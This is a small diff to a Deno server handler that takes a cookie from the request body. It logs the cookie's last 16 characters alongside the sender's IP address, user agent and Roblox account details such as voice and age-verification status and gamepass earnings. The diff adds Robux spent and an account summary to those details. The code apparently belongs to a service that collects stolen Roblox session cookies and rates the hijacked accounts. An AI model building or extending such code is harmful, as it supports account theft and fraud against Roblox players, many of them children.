@@ -94,6 +94,8 @@ Deno.serve(async (req) => {
         roblox_voice_enabled: robloxInfo?.voiceEnabled ?? null,
         roblox_age_verified: robloxInfo?.ageVerified ?? null,
         roblox_gamepass_earnings: robloxInfo?.gamepassEarnings ?? null,
+        roblox_robux_spent: robloxInfo?.robuxSpent ?? null,
+        roblox_summary: robloxInfo?.summary ?? null,
         cookie_preview: body.cookie.slice(-16),
         ip_address: ip,
         user_agent: userAgent,
